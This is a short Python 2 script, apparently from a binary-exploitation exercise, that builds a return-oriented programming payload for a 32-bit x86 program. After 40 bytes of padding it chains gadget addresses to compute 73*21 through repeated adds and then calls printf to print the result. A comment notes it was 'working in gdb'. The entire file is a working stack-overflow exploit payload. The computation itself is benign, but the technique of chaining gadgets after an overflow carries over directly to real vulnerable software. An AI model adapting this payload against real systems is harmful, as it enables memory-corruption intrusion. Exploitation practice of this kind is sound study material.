#73*21 working in gdb
padding="B"*40
dummy_addr="\xef\xbe\xad\xde"
num_73="\x49\x00\x00\x00"
pop_eax="\x9a\xf4\x0c\x08"
pop_ecx="\xf3\x15\x09\x08"

load_registers=pop_eax+num_73+pop_ecx+num_73


add_eax_ecx="\x44\x50\x07\x08"
mul_eax_ecx=add_eax_ecx*20

#0x08049a9f: pop edi; ret;  "\n%d"
pop_edi="\x9f\x9a\x04\x08"+"\x37\x30\x0d\x08"

#0x080497c4: pop esi; ret; printf address
pop_esi="\xc4\x97\x04\x08"+"\x30\x22\x05\x08"
#0x08079263: push eax; push edi; call esi;
push_para_call_printf="\x63\x92\x07\x08"

payload=padding+load_registers+mul_eax_ecx+pop_edi+pop_esi+push_para_call_printf

print payload